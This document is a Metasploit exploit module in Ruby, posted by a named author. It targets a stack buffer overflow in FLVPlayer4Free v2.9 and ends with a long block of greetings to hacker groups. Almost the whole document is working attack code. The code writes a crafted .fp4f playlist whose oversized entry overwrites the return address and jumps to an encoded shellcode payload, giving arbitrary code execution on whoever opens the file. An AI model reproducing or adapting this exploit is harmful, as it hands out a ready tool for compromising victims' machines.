###
# Title : FLVPlayer4Free v2.9 (.fp4f) Stack Buffer Overflow (meta)
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com (ked-h@1337day.com) | ked-h@exploit-id.com
# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
# Web Site : www.1337day.com * www.exploit-id.com
# Twitter page : twitter.com/kedans
# platform : windows
# Impact : Stack Buffer Overflow (via MetaSploit3)
# Tested on : [Windows XP (Univ)]
##
# $ fp4f_sbof.rb | 01/06/2011 22:57 $
###

require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            'Name' => 'FLVPlayer4Free v2.9 (.fp4f) Stack Buffer Overflow',
			'Description'    => %q{
                This module exploits a stack buffer overflow in versions v2.9
               creating a specially crafted .m3u8 file, an attacker may be able 
               to execute arbitrary code.
			},
            'License' => MSF_LICENSE,
            'Author' => 
			 [
			'KedAns-Dz <ked-h[at]hotmail.com>'
			 ],
            'Version' => 'Version 1',
            'References' =>
                [
                    [ 'URL', 'http://1337day.com/exploits/15706' ],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'process',
                },
            'Payload' =>
                {
                    'Space' => 4488,
                    'BadChars' => "\x00\x20\x0a\x0d",
                    'StackAdjustment' => -3500,
                    'DisableNops' => 'True',
                    'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,
                    'EncoderOptions' =>
                        {
                          'BufferRegister' => 'ESI',
                        }
                },
            'Platform' => 'win',
            'Targets' =>
                [
                    [ 'Windows XP SP3 France', { 'Ret' => 0x7C817067} ], # jmp ESP From kernel32.dl
 
                ],
            'Privileged' => false,
            'DefaultTarget' => 0))
 
        register_options(
            [
                OptString.new('FILENAME', [ false, 'The file name.', 'ked.fp4f']),
            ], self.class)
    end
 
 
    def exploit

      attack = "http://"
        attack << rand_text_alphanumeric(4488) # Buffer
        attack << "\xF0\xDB\x7D\x00" # EIP from FLVPlayer4Free.exe
        attack << "\x90" * 30 # nopsled
        attack << [target.ret].pack('V') # jmp ESP From kernel32.dl
        attack << payload.encoded # Payload
        attack << ".flv"

       sploit = "[type]\n"
        sploit << "type=playlist\n"
        sploit << "version=1\n"
        sploit << "[general]\n"
        sploit << "lastfile=" + attack + "\n"
        sploit << "filescount=1\n"
        sploit << "[files]\n"
        sploit << "0=" + attack + "\n"
		
        ked = sploit
        print_status("Creating '#{datastore['FILENAME']}' file ...")
        file_create(ked)
 
    end
 
end

#================[ Exploited By KedAns-Dz * HST-Dz * ]===========================================  
# Greets To : [D] HaCkerS-StreeT-Team [Z] < Algerians HaCkerS > Islampard + Z4k1-X-EnG + Dr.Ride
# + Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re (www.1337day.com) 
# Inj3ct0r Members 31337 : Indoushka * KnocKout * eXeSoul * eidelweiss * SeeMe * XroGuE * ZoRLu
# gunslinger_ * Sn!pEr.S!Te * anT!-Tr0J4n * ^Xecuti0N3r 'www.1337day.com/team' ++ .... * Str0ke
# Exploit-ID Team : jos_ali_joe + Caddy-Dz + kaMtiEz + r3m1ck (exploit-id.com) * TreX (hotturks.org)
# JaGo-Dz (sec4ever.com) * CEO (0nto.me) * PaCketStorm Team (www.packetstormsecurity.org)
# www.metasploit.com * UE-Team (www.09exploit.com) * All Security and Exploits Webs ...
# -+-+-+-+-+-+-+-+-+-+-+-+={ Greetings to Friendly Teams : }=+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
# (D) HaCkerS-StreeT-Team (Z) | Inj3ct0r | Exploit-ID | UE-Team | PaCket.Storm.Sec TM | Sec4Ever 
# h4x0re-Sec | Dz-Ghost | INDONESIAN CODER | HotTurks | IndiShell | D.N.A | DZ Team | Milw0rm
# Indian Cyber Army | MetaSploit | BaCk-TraCk | AutoSec.Tools | HighTech.Bridge SA | Team DoS-Dz
#================================================================================================
